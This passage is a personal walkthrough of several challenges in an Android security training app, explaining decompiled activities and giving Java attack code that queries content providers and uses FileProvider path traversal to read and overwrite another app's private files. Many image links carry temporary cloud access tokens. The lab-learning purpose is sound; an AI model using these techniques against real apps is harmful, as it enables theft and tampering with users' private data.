dR2dB8xvILljiC7laDz%2F5By04dkaQylLa5gXFglJyDfBJTAT5faGeO9PYHNZz4vBdjHyKDprWnqsWFGCiImcLaVC7v2DhUK%2BsrOQFPUYyWGZVaeMlVDlvO&X-Amz-Signature=261e7aec0256c0340cd218cd3d8840a5c5192e89fdb5f131c67cd14be3c6eb86&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
the success method is in if block where id is 31 and imatch should be 2 which means the path should be /flag/31
hence the content uri will be content://io.hextree.flag31/flag/31 and the code that i wrote to solve the flag is 
```java
@Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Cursor cursor = getContentResolver().query(
                Uri.parse("content://io.hextree.flag31/flag/31"),
                null, null,
                null, null
        );
//dump uri
        if (cursor!=null && cursor.moveToFirst()) {
            do {
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < cursor.getColumnCount(); i++) {
                    if (sb.length() > 0) {
                        sb.append(", ");
                    }
                    sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i));
                }
                Log.d("flag", sb.toString());
            } while (cursor.moveToNext());
        }
    }
```
### Flag34
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/51dfded5-2eb3-8139-90b1-0003750a523f/d242874d-3636-42e0-9903-2cd8395b2296/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJXEGKAQ%2F20260423%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260423T045518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFJEgUby7iG2m8MXpggHbWtZgmisNSvwBruBkO2ibEYLAiEAsp5vG5R3X%2B6fEgvZxc4sJNkOV%2Fld7TxTBjlf%2BXtmy6Yq%2FwMIXBAAGgw2Mzc0MjMxODM4MDUiDOBLvf%2FfBqMYJz%2BpuCrcAxsVuDBKiGWw4o2kCgzYAIjkhbFXgqlljJwhA5Ccu6DYM9CxgsYhhLqL359kRIcOvdizbi3qSFwXxSLxMoMBWGlbJJ0Tijfnm8stl46beWwhcehBPZoZvYW%2BNM%2BSNGfur4dlQtvIejRyX66QyEuSJ8N1U2z3EZ0EQZvqWPTBmXwq1Tga%2BD5UDlhcbkzVKwc5pQjCsdHVFYfYb2CkKO%2FUJ5QOY8OpPI%2Fjm33FhR96Q5cQY1kUN3zT9dFf46SdUGvRzkSCg85lULG%2F8ikIFwkGKKbtUrHsB7kKMMHijZ75JTDFS3n5dk49Wf3Xmg8X3ZW560%2FDx3TWvJBmm7zaXVCtJPGoVsVcsE7L9cNwkLw2K8qI4ZtKHE%2BpmBfwtrAls7YbMAJXU0%2F4BLXUHNaHq21w8THKnyB0lQ4Ch9BDh25sP2BMIPvoT1xJxWthOTovHuw2WbN7JBsNjA5TwVO4xeoBeyeCMauXcY3tCX%2BVYcTePCxs%2BmeUpciCrmJZcJ2f9o895R19PqvQH9iCyCXnARTpteXHHQcb1yAJ09sLdIbEbhaWqN3%2Bbt10qz0FTL4wDCrkGzUOqyprUd55o21QpSD%2FJ683xT6p70L0FS%2Fk0xGpX6gPC8F5Vo3ueNt220gQMNKXps8GOqUB98mACGjVYBEjmPCH9wbRacoRKntjbpol1QmfKAsSfrv71PKOA74U8ZnZoYVqV28QyQzwAR%2B0Y%2BC4ung%2BqrMJTSP%2FSCE9OzPYKh5zmWdR2dB8xvILljiC7laDz%2F5By04dkaQylLa5gXFglJyDfBJTAT5faGeO9PYHNZz4vBdjHyKDprWnqsWFGCiImcLaVC7v2DhUK%2BsrOQFPUYyWGZVaeMlVDlvO&X-Amz-Signature=630d721634e19f6dea2030caa2baafc3958230814a409fe6cdb3bea70e415f69&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
The above code is from flag34 activity by understanding the code we can say the code is waiting for an intent containg a string labelled as fliename and if the string is null it creates a file named secrets.txt it creates a new uri for this specific file using getfiledir() and sends it back using the method setresult() the addflag(3) represents its adding flags`FLAG_GRANT_READ_URI_PERMISSION FLAG_GRANT_WRITE_URI_PERMISSION` with the authority io.hextree.files which is present in the android manifest
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/51dfded5-2eb3-8139-90b1-0003750a523f/9b288b16-29f3-41a2-b88c-16a0463c8942/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJXEGKAQ%2F20260423%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260423T045518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFJEgUby7iG2m8MXpggHbWtZgmisNSvwBruBkO2ibEYLAiEAsp5vG5R3X%2B6fEgvZxc4sJNkOV%2Fld7TxTBjlf%2BXtmy6Yq%2FwMIXBAAGgw2Mzc0MjMxODM4MDUiDOBLvf%2FfBqMYJz%2BpuCrcAxsVuDBKiGWw4o2kCgzYAIjkhbFXgqlljJwhA5Ccu6DYM9CxgsYhhLqL359kRIcOvdizbi3qSFwXxSLxMoMBWGlbJJ0Tijfnm8stl46beWwhcehBPZoZvYW%2BNM%2BSNGfur4dlQtvIejRyX66QyEuSJ8N1U2z3EZ0EQZvqWPTBmXwq1Tga%2BD5UDlhcbkzVKwc5pQjCsdHVFYfYb2CkKO%2FUJ5QOY8OpPI%2Fjm33FhR96Q5cQY1kUN3zT9dFf46SdUGvRzkSCg85lULG%2F8ikIFwkGKKbtUrHsB7kKMMHijZ75JTDFS3n5dk49Wf3Xmg8X3ZW560%2FDx3TWvJBmm7zaXVCtJPGoVsVcsE7L9cNwkLw2K8qI4ZtKHE%2BpmBfwtrAls7YbMAJXU0%2F4BLXUHNaHq21w8THKnyB0lQ4Ch9BDh25sP2BMIPvoT1xJxWthOTovHuw2WbN7JBsNjA5TwVO4xeoBeyeCMauXcY3tCX%2BVYcTePCxs%2BmeUpciCrmJZcJ2f9o895R19PqvQH9iCyCXnARTpteXHHQcb1yAJ09sLdIbEbhaWqN3%2Bbt10qz0FTL4wDCrkGzUOqyprUd55o21QpSD%2FJ683xT6p70L0FS%2Fk0xGpX6gPC8F5Vo3ueNt220gQMNKXps8GOqUB98mACGjVYBEjmPCH9wbRacoRKntjbpol1QmfKAsSfrv71PKOA74U8ZnZoYVqV28QyQzwAR%2B0Y%2BC4ung%2BqrMJTSP%2FSCE9OzPYKh5zmWdR2dB8xvILljiC7laDz%2F5By04dkaQylLa5gXFglJyDfBJTAT5faGeO9PYHNZz4vBdjHyKDprWnqsWFGCiImcLaVC7v2DhUK%2BsrOQFPUYyWGZVaeMlVDlvO&X-Amz-Signature=58d04378f36bd0a4b4d30e4f7d7b86b703fce908c84b61e598fde77b7f70a971&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
so to call the function prepareflag which has the actual flag and send a string that contains thr path of flag34.txt along with the intent and it checks weather the file is present in the memory 
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/51dfded5-2eb3-8139-90b1-0003750a523f/5c4e4911-7bcc-40d0-985f-4f05338d6067/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJXEGKAQ%2F20260423%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260423T045518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFJEgUby7iG2m8MXpggHbWtZgmisNSvwBruBkO2ibEYLAiEAsp5vG5R3X%2B6fEgvZxc4sJNkOV%2Fld7TxTBjlf%2BXtmy6Yq%2FwMIXBAAGgw2Mzc0MjMxODM4MDUiDOBLvf%2FfBqMYJz%2BpuCrcAxsVuDBKiGWw4o2kCgzYAIjkhbFXgqlljJwhA5Ccu6DYM9CxgsYhhLqL359kRIcOvdizbi3qSFwXxSLxMoMBWGlbJJ0Tijfnm8stl46beWwhcehBPZoZvYW%2BNM%2BSNGfur4dlQtvIejRyX66QyEuSJ8N1U2z3EZ0EQZvqWPTBmXwq1Tga%2BD5UDlhcbkzVKwc5pQjCsdHVFYfYb2CkKO%2FUJ5QOY8OpPI%2Fjm33FhR96Q5cQY1kUN3zT9dFf46SdUGvRzkSCg85lULG%2F8ikIFwkGKKbtUrHsB7kKMMHijZ75JTDFS3n5dk49Wf3Xmg8X3ZW560%2FDx3TWvJBmm7zaXVCtJPGoVsVcsE7L9cNwkLw2K8qI4ZtKHE%2BpmBfwtrAls7YbMAJXU0%2F4BLXUHNaHq21w8THKnyB0lQ4Ch9BDh25sP2BMIPvoT1xJxWthOTovHuw2WbN7JBsNjA5TwVO4xeoBeyeCMauXcY3tCX%2BVYcTePCxs%2BmeUpciCrmJZcJ2f9o895R19PqvQH9iCyCXnARTpteXHHQcb1yAJ09sLdIbEbhaWqN3%2Bbt10qz0FTL4wDCrkGzUOqyprUd55o21QpSD%2FJ683xT6p70L0FS%2Fk0xGpX6gPC8F5Vo3ueNt220gQMNKXps8GOqUB98mACGjVYBEjmPCH9wbRacoRKntjbpol1QmfKAsSfrv71PKOA74U8ZnZoYVqV28QyQzwAR%2B0Y%2BC4ung%2BqrMJTSP%2FSCE9OzPYKh5zmWdR2dB8xvILljiC7laDz%2F5By04dkaQylLa5gXFglJyDfBJTAT5faGeO9PYHNZz4vBdjHyKDprWnqsWFGCiImcLaVC7v2DhUK%2BsrOQFPUYyWGZVaeMlVDlvO&X-Amz-Signature=0be6faf7eb115bba4235cec6abff9f0dec088da5353245e0e4b69ee25cdd3282&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
since the code is using getFilesDir() it checks for the path where the file is stored and then load them to check weather it exists or not 
since its using setresult it send the result we need to use onActivityResult() method to receive it in our attack code 
Since the app sends us a file instead of the text in that we have read that file the code for reading the file which is given in the video by the challenge creator and print in flags
```java
protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent intent = new Intent();
        intent.putExtra("filename", "flags/flag34.txt");
        intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag34Activity");
        startActivityForResult(intent, 42);
    }
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode == 42 && data != null && data.getData() != null) {
            try (InputStream is = getContentResolver().openInputStream(data.getData());
                 BufferedReader reader = new BufferedReader(new InputStreamReader(is))) {

                String line;
                while ((line = reader.readLine()) != null) {
                    Log.i("FLAG_EXTRACTOR", "Found Flag: " + line);
                }
            } catch (Exception e) {
                Log.e("FLAG_EXTRACTOR", "Error reading file", e);
            }
        }
    }
```
### Flag 35
This challenge introduces us to path traversal in app’s internal directory if we can get access to internal directory, we could make a potential exploit
The snapshot of code is from flag35 activity
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/51dfded5-2eb3-8139-90b1-0003750a523f/36e1f1b8-60fb-43e3-ad38-05ca1d2188c5/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJXEGKAQ%2F20260423%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260423T045518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFJEgUby7iG2m8MXpggHbWtZgmisNSvwBruBkO2ibEYLAiEAsp5vG5R3X%2B6fEgvZxc4sJNkOV%2Fld7TxTBjlf%2BXtmy6Yq%2FwMIXBAAGgw2Mzc0MjMxODM4MDUiDOBLvf%2FfBqMYJz%2BpuCrcAxsVuDBKiGWw4o2kCgzYAIjkhbFXgqlljJwhA5Ccu6DYM9CxgsYhhLqL359kRIcOvdizbi3qSFwXxSLxMoMBWGlbJJ0Tijfnm8stl46beWwhcehBPZoZvYW%2BNM%2BSNGfur4dlQtvIejRyX66QyEuSJ8N1U2z3EZ0EQZvqWPTBmXwq1Tga%2BD5UDlhcbkzVKwc5pQjCsdHVFYfYb2CkKO%2FUJ5QOY8OpPI%2Fjm33FhR96Q5cQY1kUN3zT9dFf46SdUGvRzkSCg85lULG%2F8ikIFwkGKKbtUrHsB7kKMMHijZ75JTDFS3n5dk49Wf3Xmg8X3ZW560%2FDx3TWvJBmm7zaXVCtJPGoVsVcsE7L9cNwkLw2K8qI4ZtKHE%2BpmBfwtrAls7YbMAJXU0%2F4BLXUHNaHq21w8THKnyB0lQ4Ch9BDh25sP2BMIPvoT1xJxWthOTovHuw2WbN7JBsNjA5TwVO4xeoBeyeCMauXcY3tCX%2BVYcTePCxs%2BmeUpciCrmJZcJ2f9o895R19PqvQH9iCyCXnARTpteXHHQcb1yAJ09sLdIbEbhaWqN3%2Bbt10qz0FTL4wDCrkGzUOqyprUd55o21QpSD%2FJ683xT6p70L0FS%2Fk0xGpX6gPC8F5Vo3ueNt220gQMNKXps8GOqUB98mACGjVYBEjmPCH9wbRacoRKntjbpol1QmfKAsSfrv71PKOA74U8ZnZoYVqV28QyQzwAR%2B0Y%2BC4ung%2BqrMJTSP%2FSCE9OzPYKh5zmWdR2dB8xvILljiC7laDz%2F5By04dkaQylLa5gXFglJyDfBJTAT5faGeO9PYHNZz4vBdjHyKDprWnqsWFGCiImcLaVC7v2DhUK%2BsrOQFPUYyWGZVaeMlVDlvO&X-Amz-Signature=edab1b75f288f79808e7e31b2802b7085cd00c84bc35ba24e3f5c6e2ef2a41ca&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
This challenge is similar to previous challenge except a slight change in the directory where flag35.txt stored
This Flag uses a misconfigure path, which is root file path which essentially gives any file stored in the root storage
As we can see there is a flag35 provider class which uses the R.xml.rootpaths 
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/51dfded5-2eb3-8139-90b1-0003750a523f/c971435f-f435-4319-8a86-220b6fdece62/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJXEGKAQ%2F20260423%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260423T045518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFJEgUby7iG2m8MXpggHbWtZgmisNSvwBruBkO2ibEYLAiEAsp5vG5R3X%2B6fEgvZxc4sJNkOV%2Fld7TxTBjlf%2BXtmy6Yq%2FwMIXBAAGgw2Mzc0MjMxODM4MDUiDOBLvf%2FfBqMYJz%2BpuCrcAxsVuDBKiGWw4o2kCgzYAIjkhbFXgqlljJwhA5Ccu6DYM9CxgsYhhLqL359kRIcOvdizbi3qSFwXxSLxMoMBWGlbJJ0Tijfnm8stl46beWwhcehBPZoZvYW%2BNM%2BSNGfur4dlQtvIejRyX66QyEuSJ8N1U2z3EZ0EQZvqWPTBmXwq1Tga%2BD5UDlhcbkzVKwc5pQjCsdHVFYfYb2CkKO%2FUJ5QOY8OpPI%2Fjm33FhR96Q5cQY1kUN3zT9dFf46SdUGvRzkSCg85lULG%2F8ikIFwkGKKbtUrHsB7kKMMHijZ75JTDFS3n5dk49Wf3Xmg8X3ZW560%2FDx3TWvJBmm7zaXVCtJPGoVsVcsE7L9cNwkLw2K8qI4ZtKHE%2BpmBfwtrAls7YbMAJXU0%2F4BLXUHNaHq21w8THKnyB0lQ4Ch9BDh25sP2BMIPvoT1xJxWthOTovHuw2WbN7JBsNjA5TwVO4xeoBeyeCMauXcY3tCX%2BVYcTePCxs%2BmeUpciCrmJZcJ2f9o895R19PqvQH9iCyCXnARTpteXHHQcb1yAJ09sLdIbEbhaWqN3%2Bbt10qz0FTL4wDCrkGzUOqyprUd55o21QpSD%2FJ683xT6p70L0FS%2Fk0xGpX6gPC8F5Vo3ueNt220gQMNKXps8GOqUB98mACGjVYBEjmPCH9wbRacoRKntjbpol1QmfKAsSfrv71PKOA74U8ZnZoYVqV28QyQzwAR%2B0Y%2BC4ung%2BqrMJTSP%2FSCE9OzPYKh5zmWdR2dB8xvILljiC7laDz%2F5By04dkaQylLa5gXFglJyDfBJTAT5faGeO9PYHNZz4vBdjHyKDprWnqsWFGCiImcLaVC7v2DhUK%2BsrOQFPUYyWGZVaeMlVDlvO&X-Amz-Signature=fff5029463236e61755e408e9a8579df1a66a33b1421385b2e8b0ae5ff5a4a6a&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
and in the xml file we can find the path where the files is being stored the below snapshot indicates the xml file of root access
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/51dfded5-2eb3-8139-90b1-0003750a523f/ce467271-8c1a-4f7c-b96d-ad54338d0e8c/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJXEGKAQ%2F20260423%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260423T045518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFJEgUby7iG2m8MXpggHbWtZgmisNSvwBruBkO2ibEYLAiEAsp5vG5R3X%2B6fEgvZxc4sJNkOV%2Fld7TxTBjlf%2BXtmy6Yq%2FwMIXBAAGgw2Mzc0MjMxODM4MDUiDOBLvf%2FfBqMYJz%2BpuCrcAxsVuDBKiGWw4o2kCgzYAIjkhbFXgqlljJwhA5Ccu6DYM9CxgsYhhLqL359kRIcOvdizbi3qSFwXxSLxMoMBWGlbJJ0Tijfnm8stl46beWwhcehBPZoZvYW%2BNM%2BSNGfur4dlQtvIejRyX66QyEuSJ8N1U2z3EZ0EQZvqWPTBmXwq1Tga%2BD5UDlhcbkzVKwc5pQjCsdHVFYfYb2CkKO%2FUJ5QOY8OpPI%2Fjm33FhR96Q5cQY1kUN3zT9dFf46SdUGvRzkSCg85lULG%2F8ikIFwkGKKbtUrHsB7kKMMHijZ75JTDFS3n5dk49Wf3Xmg8X3ZW560%2FDx3TWvJBmm7zaXVCtJPGoVsVcsE7L9cNwkLw2K8qI4ZtKHE%2BpmBfwtrAls7YbMAJXU0%2F4BLXUHNaHq21w8THKnyB0lQ4Ch9BDh25sP2BMIPvoT1xJxWthOTovHuw2WbN7JBsNjA5TwVO4xeoBeyeCMauXcY3tCX%2BVYcTePCxs%2BmeUpciCrmJZcJ2f9o895R19PqvQH9iCyCXnARTpteXHHQcb1yAJ09sLdIbEbhaWqN3%2Bbt10qz0FTL4wDCrkGzUOqyprUd55o21QpSD%2FJ683xT6p70L0FS%2Fk0xGpX6gPC8F5Vo3ueNt220gQMNKXps8GOqUB98mACGjVYBEjmPCH9wbRacoRKntjbpol1QmfKAsSfrv71PKOA74U8ZnZoYVqV28QyQzwAR%2B0Y%2BC4ung%2BqrMJTSP%2FSCE9OzPYKh5zmWdR2dB8xvILljiC7laDz%2F5By04dkaQylLa5gXFglJyDfBJTAT5faGeO9PYHNZz4vBdjHyKDprWnqsWFGCiImcLaVC7v2DhUK%2BsrOQFPUYyWGZVaeMlVDlvO&X-Amz-Signature=b175b1c0964d04fca8a6cfc3de77c8f6ffe866e1e0e1fea9bd76cf00b7612467&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
the authority is still the same one 
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/51dfded5-2eb3-8139-90b1-0003750a523f/9876819b-e018-4cd3-9e3d-771920bb0ea9/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJXEGKAQ%2F20260423%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260423T045518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFJEgUby7iG2m8MXpggHbWtZgmisNSvwBruBkO2ibEYLAiEAsp5vG5R3X%2B6fEgvZxc4sJNkOV%2Fld7TxTBjlf%2BXtmy6Yq%2FwMIXBAAGgw2Mzc0MjMxODM4MDUiDOBLvf%2FfBqMYJz%2BpuCrcAxsVuDBKiGWw4o2kCgzYAIjkhbFXgqlljJwhA5Ccu6DYM9CxgsYhhLqL359kRIcOvdizbi3qSFwXxSLxMoMBWGlbJJ0Tijfnm8stl46beWwhcehBPZoZvYW%2BNM%2BSNGfur4dlQtvIejRyX66QyEuSJ8N1U2z3EZ0EQZvqWPTBmXwq1Tga%2BD5UDlhcbkzVKwc5pQjCsdHVFYfYb2CkKO%2FUJ5QOY8OpPI%2Fjm33FhR96Q5cQY1kUN3zT9dFf46SdUGvRzkSCg85lULG%2F8ikIFwkGKKbtUrHsB7kKMMHijZ75JTDFS3n5dk49Wf3Xmg8X3ZW560%2FDx3TWvJBmm7zaXVCtJPGoVsVcsE7L9cNwkLw2K8qI4ZtKHE%2BpmBfwtrAls7YbMAJXU0%2F4BLXUHNaHq21w8THKnyB0lQ4Ch9BDh25sP2BMIPvoT1xJxWthOTovHuw2WbN7JBsNjA5TwVO4xeoBeyeCMauXcY3tCX%2BVYcTePCxs%2BmeUpciCrmJZcJ2f9o895R19PqvQH9iCyCXnARTpteXHHQcb1yAJ09sLdIbEbhaWqN3%2Bbt10qz0FTL4wDCrkGzUOqyprUd55o21QpSD%2FJ683xT6p70L0FS%2Fk0xGpX6gPC8F5Vo3ueNt220gQMNKXps8GOqUB98mACGjVYBEjmPCH9wbRacoRKntjbpol1QmfKAsSfrv71PKOA74U8ZnZoYVqV28QyQzwAR%2B0Y%2BC4ung%2BqrMJTSP%2FSCE9OzPYKh5zmWdR2dB8xvILljiC7laDz%2F5By04dkaQylLa5gXFglJyDfBJTAT5faGeO9PYHNZz4vBdjHyKDprWnqsWFGCiImcLaVC7v2DhUK%2BsrOQFPUYyWGZVaeMlVDlvO&X-Amz-Signature=1ce2b2466d8edb78d36dcc835250132d2103a278668689e4e899bc9976a7f4f5&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
the method getfiledir() by default goes into the app’s files not to the app’s root directory
Hence the attack code I made for this challenge is and the filegetdir() function loads correctly we are using . ./flag35.txt because the flag is in root directory so we move one step backward
```java
 @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent intent = new Intent();
        intent.putExtra("filename", ". ./flag35.txt");
        intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag35Activity");
        startActivityForResult(intent, 42);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == 42 && data != null && data.getData() != null) {
            try {
                InputStream inputStream = getContentResolver().openInputStream(data.getData());
                BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
                String line;
                while ((line = reader.readLine()) != null) {
                    Log.i("FLAG_EXTRACTOR", "Found Flag: " + line);
                }
            } catch (Exception e) {
                Log.e("FLAG_EXTRACTOR", "Error reading file", e);}
        }
    }
```
### Flag36
This challenge is also similar to the previous flag35 since the challenge provider mentioned the flag36.txt should be accessed by abusing flag35 and overwrite flag36.xml
since flag35 is stored in root directory and it has flag(3) which is a permission to both reading and writing files we need to gain access to flag35 get access to write in a file and move to the shared preferences to access the file of flag36  
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/51dfded5-2eb3-8139-90b1-0003750a523f/d464e6df-1280-475c-bfda-83f9fa7b88c3/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJXEGKAQ%2F20260423%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260423T045518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFJEgUby7iG2m8MXpggHbWtZgmisNSvwBruBkO2ibEYLAiEAsp5vG5R3X%2B6fEgvZxc4sJNkOV%2Fld7TxTBjlf%2BXtmy6Yq%2FwMIXBAAGgw2Mzc0MjMxODM4MDUiDOBLvf%2FfBqMYJz%2BpuCrcAxsVuDBKiGWw4o2kCgzYAIjkhbFXgqlljJwhA5Ccu6DYM9CxgsYhhLqL359kRIcOvdizbi3qSFwXxSLxMoMBWGlbJJ0Tijfnm8stl46beWwhcehBPZoZvYW%2BNM%2BSNGfur4dlQtvIejRyX66QyEuSJ8N1U2z3EZ0EQZvqWPTBmXwq1Tga%2BD5UDlhcbkzVKwc5pQjCsdHVFYfYb2CkKO%2FUJ5QOY8OpPI%2Fjm33FhR96Q5cQY1kUN3zT9dFf46SdUGvRzkSCg85lULG%2F8ikIFwkGKKbtUrHsB7kKMMHijZ75JTDFS3n5dk49Wf3Xmg8X3ZW560%2FDx3TWvJBmm7zaXVCtJPGoVsVcsE7L9cNwkLw2K8qI4ZtKHE%2BpmBfwtrAls7YbMAJXU0%2F4BLXUHNaHq21w8THKnyB0lQ4Ch9BDh25sP2BMIPvoT1xJxWthOTovHuw2WbN7JBsNjA5TwVO4xeoBeyeCMauXcY3tCX%2BVYcTePCxs%2BmeUpciCrmJZcJ2f9o895R19PqvQH9iCyCXnARTpteXHHQcb1yAJ09sLdIbEbhaWqN3%2Bbt10qz0FTL4wDCrkGzUOqyprUd55o21QpSD%2FJ683xT6p70L0FS%2Fk0xGpX6gPC8F5Vo3ueNt220gQMNKXps8GOqUB98mACGjVYBEjmPCH9wbRacoRKntjbpol1QmfKAsSfrv71PKOA74U8ZnZoYVqV28QyQzwAR%2B0Y%2BC4ung%2BqrMJTSP%2FSCE9OzPYKh5zmWdR2dB8xvILljiC7laDz%2F5By04dkaQylLa5gXFglJyDfBJTAT5faGeO9PYHNZz4vBdjHyKDprWnqsWFGCiImcLaVC7v2DhUK%2BsrOQFPUYyWGZVaeMlVDlvO&X-Amz-Signature=4343f913d3bac79ac0653b569416307f4a6033ab4ed4b678a7e7d02f4be126a1&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
flag36 is a xml file which has a string and a Boolean value which is solved and false so we need to change that to true   so i used a string builder to read and store the text and i used a replace function to replace the flase into true and send the same file to flag36 activity so the challenge gets solved 
```java
@Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent intent = new Intent();
        intent.putExtra("filename", "../shared_prefs/Flag36Preferences.xml");
        intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag35Activity");
        startActivityForResult(intent, 42);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode == 42 && data != null && data.getData() != null) {
            try {
                StringBuilder sb = new StringBuilder();
                InputStream is = getContentResolver().openInputStream(data.getData());
                BufferedReader reader = new BufferedReader(new InputStreamReader(is));
                String line;
                while ((line = reader.readLine()) != null) {
                    sb.append(line.replace("false", "true")).append("\n");
                }
                is.close();
                OutputStream os = getContentResolver().openOutputStream(data.getData());
                os.write(sb.toString().getBytes());
                os.close();
                Intent i = new Intent();
                i.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag36Activity");
                startActivity(i);

                Log.i("ATTACK", "Done");

            } catch (Exception e) {
                Log.e("ATTACK", "Error");
            }
        }
    }
```
<empty-block/>
<empty-block/>
### Flag16
what can be things that can be passed through broadcast?
You can pass **primitives (Strings, ints), Parcelable/Serializable objects, URIs, and PendingIntents** via Intent extras in a broadcast.
The tutorial tells us the Broadcast receivers are similar to intents so same attack methods and unlike intent will startactivity() we will use sendBroadcast()
If we observe the code from jadx
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/51dfded5-2eb3-8139-90b1-0003750a523f/b45bd31e-e47e-48ce-a21b-eb2de0119e95/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZJXEGKAQ%2F20260423%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260423T045518Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFJEgUby7iG2m8MXpggHbWtZgmisNSvwBruBkO2ibEYLAiEAsp5vG5R3X%2B6fEgvZxc4sJNkOV%2Fld7TxTBjlf%2BXtmy6Yq%2FwMIXBAAGgw2Mzc0MjMxODM4MDUiDOBLvf%2FfBqMYJz%2BpuCrcAxsVuDBKiGWw4o2kCgzYAIjkhbFXgqlljJwhA5Ccu6DYM9CxgsYhhLqL359kRIcOvdizbi3qSFwXxSLxMoMBWGlbJJ0Tijfnm8stl46beWwhcehBPZoZvYW%2BNM%2BSNGfu